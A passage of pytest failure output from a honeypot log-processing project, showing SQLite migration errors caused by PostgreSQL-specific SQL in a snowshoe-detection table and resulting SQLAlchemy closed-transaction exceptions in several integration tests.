            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:39:15,983:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:15,984:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:15,984:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:15,985:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:15,985:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:15,985:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log call -------------------------------
WARNING  cowrieprocessor.cli.cowrie_db:cowrie_db.py:146 Could not get schema version: (sqlite3.OperationalError) no such table: schema_state
[SQL: SELECT value FROM schema_state WHERE key = 'schema_version']
(Background on this error at: https://sqlalche.me/e/20/e3q8)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
____________________ TestHealthCLI.test_health_check_sqlite ____________________

self = <test_cli_tools.TestHealthCLI object at 0x7756b467a210>

    def test_health_check_sqlite(self) -> None:
        """Test health check with SQLite database."""
        with tempfile.NamedTemporaryFile(suffix=".sqlite", delete=False) as tmp_file:
            db_path = tmp_file.name
    
        try:
            db_url = f"sqlite:///{db_path}"
    
            # Create database and apply migrations
            settings = DatabaseSettings(url=db_url)
            engine = create_engine_from_settings(settings)
>           apply_migrations(engine)

/home/speterson/cowrieprocessor/tests/integration/test_cli_tools.py:179: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x7756b31260b0>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
----------------------------- Captured stdout call -----------------------------
2025-10-18 17:39:16,669:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 17:39:16,670:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 17:39:16,677:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 17:39:16,678:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 17:39:16,679:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 17:39:16,682:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 17:39:16,684:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 17:39:16,685:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 17:39:16,686:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 17:39:16,688:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 17:39:16,690:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 17:39:16,690:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 17:39:16,693:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 17:39:16,694:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:39:16,695:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:16,696:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:16,696:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:16,696:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:16,697:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:16,697:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log call -------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
_______________ TestCLIIntegration.test_full_cli_workflow_sqlite _______________

self = <cowrieprocessor.cli.cowrie_db.CowrieDatabase object at 0x7756b35eb6f0>
target_version = None, dry_run = False

    def migrate(self, target_version: Optional[int] = None, dry_run: bool = False) -> Dict[str, Any]:
        """Run database schema migrations.
    
        Args:
            target_version: Target schema version (None for latest)
            dry_run: Show what would be done without executing
    
        Returns:
            Migration result with details
        """
        # Check if database file exists
        if self._is_sqlite():
            db_path = self.db_url.replace("sqlite:///", "")
            db_exists = Path(db_path).exists()
        else:
            # For PostgreSQL, assume database exists if we can connect
            db_exists = True
    
        if not db_exists:
            current_version = 0
        else:
            current_version = self.get_schema_version()
    
        target = target_version or CURRENT_SCHEMA_VERSION
    
        result = {
            'current_version': current_version,
            'target_version': target,
            'migrations_applied': [],
            'dry_run': dry_run,
        }
    
        if current_version >= target:
            result['message'] = f"Database already at version {current_version}"
            return result
    
        if dry_run:
            result['migrations_applied'] = [f"Migration to version {v}" for v in range(current_version + 1, target + 1)]
            result['message'] = f"Would migrate from v{current_version} to v{target}"
            return result
    
        try:
            # Apply migrations directly - this handles creating tables if they don't exist
>           final_version = apply_migrations(self._get_engine())

/home/speterson/cowrieprocessor/cowrieprocessor/cli/cowrie_db.py:192: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x7756b31ba7b0>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError

The above exception was the direct cause of the following exception:

self = <test_cli_tools.TestCLIIntegration object at 0x7756b467a490>

    def test_full_cli_workflow_sqlite(self) -> None:
        """Test complete CLI workflow with SQLite."""
        with tempfile.NamedTemporaryFile(suffix=".sqlite", delete=False) as tmp_file:
            db_path = tmp_file.name
    
        try:
            db_url = f"sqlite:///{db_path}"
            db = CowrieDatabase(db_url)
    
            # 1. Migrate database
>           migrate_result = db.migrate()

/home/speterson/cowrieprocessor/tests/integration/test_cli_tools.py:218: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

self = <cowrieprocessor.cli.cowrie_db.CowrieDatabase object at 0x7756b35eb6f0>
target_version = None, dry_run = False

    def migrate(self, target_version: Optional[int] = None, dry_run: bool = False) -> Dict[str, Any]:
        """Run database schema migrations.
    
        Args:
            target_version: Target schema version (None for latest)
            dry_run: Show what would be done without executing
    
        Returns:
            Migration result with details
        """
        # Check if database file exists
        if self._is_sqlite():
            db_path = self.db_url.replace("sqlite:///", "")
            db_exists = Path(db_path).exists()
        else:
            # For PostgreSQL, assume database exists if we can connect
            db_exists = True
    
        if not db_exists:
            current_version = 0
        else:
            current_version = self.get_schema_version()
    
        target = target_version or CURRENT_SCHEMA_VERSION
    
        result = {
            'current_version': current_version,
            'target_version': target,
            'migrations_applied': [],
            'dry_run': dry_run,
        }
    
        if current_version >= target:
            result['message'] = f"Database already at version {current_version}"
            return result
    
        if dry_run:
            result['migrations_applied'] = [f"Migration to version {v}" for v in range(current_version + 1, target + 1)]
            result['message'] = f"Would migrate from v{current_version} to v{target}"
            return result
    
        try:
            # Apply migrations directly - this handles creating tables if they don't exist
            final_version = apply_migrations(self._get_engine())
            result['final_version'] = final_version
            result['migrations_applied'] = [
                f"Applied migration to version {v}" for v in range(current_version + 1, final_version + 1)
            ]
            result['message'] = f"Successfully migrated to version {final_version}"
    
        except Exception as e:
            result['error'] = str(e)
            result['message'] = f"Migration failed: {e}"
>           raise Exception(f"Migration failed: {e}") from e
E           Exception: Migration failed: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/cowrieprocessor/cli/cowrie_db.py:202: Exception
----------------------------- Captured stdout call -----------------------------
2025-10-18 17:39:17,114:WARNING:cowrieprocessor.cli.cowrie_db:cowrie_db.py:get_schema_version:Could not get schema version: (sqlite3.OperationalError) no such table: schema_state
[SQL: SELECT value FROM schema_state WHERE key = 'schema_version']
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:39:17,208:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 17:39:17,209:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 17:39:17,216:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 17:39:17,218:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 17:39:17,219:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 17:39:17,222:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 17:39:17,223:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 17:39:17,225:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 17:39:17,226:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 17:39:17,228:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 17:39:17,229:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 17:39:17,232:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 17:39:17,233:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 17:39:17,234:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:39:17,235:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:17,236:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:17,238:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:17,239:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:17,239:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:17,239:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log call -------------------------------
WARNING  cowrieprocessor.cli.cowrie_db:cowrie_db.py:146 Could not get schema version: (sqlite3.OperationalError) no such table: schema_state
[SQL: SELECT value FROM schema_state WHERE key = 'schema_version']
(Background on this error at: https://sqlalche.me/e/20/e3q8)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
__ TestCowrieDatabaseSQLAlchemy2Integration.test_engine_creation_sqlalchemy2 ___

self = <test_cowrie_db_sqlalchemy2.TestCowrieDatabaseSQLAlchemy2Integration object at 0x7756b467b610>
cowrie_db = <cowrieprocessor.cli.cowrie_db.CowrieDatabase object at 0x7756b2a1cf50>

    def test_engine_creation_sqlalchemy2(self, cowrie_db):
        """Test engine creation with SQLAlchemy 2.0 patterns."""
        engine = cowrie_db._get_engine()
    
        # Test that engine is properly created
        assert engine is not None
        assert cowrie_db._engine is engine
    
        # Test that future=True is set for SQLAlchemy 2.0 compatibility
>       assert hasattr(engine, 'future')
E       AssertionError: assert False
